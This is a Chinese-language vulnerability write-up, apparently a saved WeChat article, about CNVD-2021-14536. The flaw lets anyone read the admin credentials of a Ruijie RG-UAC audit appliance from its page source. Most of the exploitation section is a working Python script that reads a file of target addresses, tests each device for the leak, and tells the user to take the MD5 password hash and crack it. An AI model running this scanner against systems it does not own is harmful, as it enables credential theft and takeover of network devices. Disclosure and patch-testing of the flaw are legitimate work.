> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0r5UqqqHHaV-UaGGNGUR1Q)

漏洞描述
----

锐捷 RG-UAC 统一上网行为管理审计系统存在信息泄露漏洞，攻击者可以通过审查网页源代码获取到用户账号和密码，导致管理员用户认证信息泄露。

漏洞编号
----

*   CNVD-2021-14536
    

利用类型
----

远程

漏洞分类
----

*   php
    

适用版本
----

锐捷 RG-UAC 统一上网行为管理审计系统

标签
--

*   php
    
*   IOT
    

发布日期
----

2021.03.08

漏洞等级
----

高危

漏洞原理
----

源码内密码的 hash

漏洞利用
----

### 利用脚本

```
  import requests
  import sys
  import random
  import re
  from requests.packages.urllib3.exceptions import InsecureRequestWarning

  def title():
      print('+------------------------------------------')
      print('+ 33[34mPOC_Des: http://wiki.peiqi.tech                                   33[0m')
      print('+ 33[34mGithub : https://github.com/PeiQi0                                 33[0m')
      print('+ 33[34m公众号 : PeiQi文库                                                     33[0m')
      print('+ 33[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             33[0m')
      print('+ 33[36m使用格式: python3 poc.py                                           33[0m')
      print('+ 33[36mFile         >>> ip.txt                             33[0m')
      print('+------------------------------------------')

  def POC_1(target_url):
      vuln_url = target_url
      headers = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
      }
      try:
          requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
          response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
          if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
              print("33[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 33[0m".format(target_url))
          else:
              print("33[31m[x] 目标 {}不存在漏洞 33[0m".format(target_url))
      except Exception as e:
          print("33[31m[x] 目标 {}不存在漏洞 33[0m".format(target_url))

  def Scan(file_name):
      with open(file_name, "r", encoding='utf8') as scan_url:
          for url in scan_url:
              if url[:4] != "http":
                  url = "http://" + url
              url = url.strip('n')
              try:
                  POC_1(url)

              except Exception as e:
                  print("33[31m[x] 请求报错 33[0m".format(e))
                  continue

  if __name__ == '__main__':
      title()
      file_name = str(input("33[35mPlease input Attack FilenFile >>> 33[0m"))
      Scan(file_name)
```

### 利用方法

*   查看源码
    

*   找到密码的 hash
    
*   md5 解密
    

### 利用过程

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MXsY4xUTfskgxhKOO2hFy9uzibVqU1QfsupTVIWjLl7YYk5Q0zE7LWNrOH79gqepda5gwB4l3nZapg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MXsY4xUTfskgxhKOO2hFy9upXjDxGAc8NdtgjtWdVxGnzFf7s3Tt51zmf3x1X48fmLIMzWniaEjotQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MXsY4xUTfskgxhKOO2hFy9uS2j3oN1Egp8Mxx1vOklRNTPsHHmeC5x7OBysdt7ednL7cb4XsyT0kQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MXsY4xUTfskgxhKOO2hFy9u2Ll0Vsz8mgNdTxyl8icQzenR8FQ61BMg3oQVYZVnxxIxCfDMicBENx5g/640?wx_fmt=png)

参考链接
----

*   https://blog.csdn.net/Adminxe/article/details/114584215